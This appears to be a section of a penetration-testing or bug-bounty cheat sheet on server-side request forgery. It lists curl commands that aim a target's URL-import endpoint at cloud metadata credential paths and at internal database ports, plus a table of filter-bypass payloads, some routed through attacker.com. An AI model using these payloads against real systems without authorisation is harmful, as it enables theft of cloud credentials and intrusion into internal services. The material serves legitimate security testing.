## 3F. SSRF — Server-Side Request Forgery
*CRUXSS-INPV-11 | CRUXSS-API-INPV-04 | CRUXSS-CLD-COMP-01 | CRUXSS-EXT-EXPL-07*

```bash
# Test in: webhook URLs, import-from-URL, profile picture URL,
# PDF generators, XML parsers, API integrations (CRUXSS-API-CONF-03)

# Cloud metadata (CRUXSS-CLD-COMP-01)
curl "https://TARGET/api/import?url=http://169.254.169.254/latest/meta-data/"
curl "https://TARGET/api/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP metadata (needs header)
# curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
#   -H "Metadata-Flavor: Google"

# Internal services
curl "https://TARGET/api/import?url=http://127.0.0.1:6379/"    # Redis
curl "https://TARGET/api/import?url=http://127.0.0.1:9200/"    # Elasticsearch
curl "https://TARGET/api/import?url=http://127.0.0.1:27017/"   # MongoDB
```

### SSRF IP Bypass Payloads
| Bypass | Payload | CRUXSS-ID |
|---|---|---|
| Decimal IP | `http://2130706433/` | CRUXSS-INPV-11 |
| Hex IP | `http://0x7f000001/` | CRUXSS-INPV-11 |
| Octal IP | `http://0177.0.0.1/` | CRUXSS-INPV-11 |
| Short IP | `http://127.1/` | CRUXSS-INPV-11 |
| IPv6 | `http://[::1]/` | CRUXSS-INPV-11 |
| URL encode | `http://127.0.0.1%2523@attacker.com` | CRUXSS-INPV-11 |
| Redirect chain | attacker.com → 302 → 169.254.x | CRUXSS-INPV-11 |

**SSRF Impact Triage:**
- DNS-only = Informational (don't submit)
- Internal service accessible = Medium (CRUXSS-CLD-COMP-01)
- Cloud metadata readable = High
- IAM keys exfiltrated = Critical (CRUXSS-CLD-ATK-01)
- Docker API / K8s API = Critical RCE (CRUXSS-CLD-COMP-04)

---

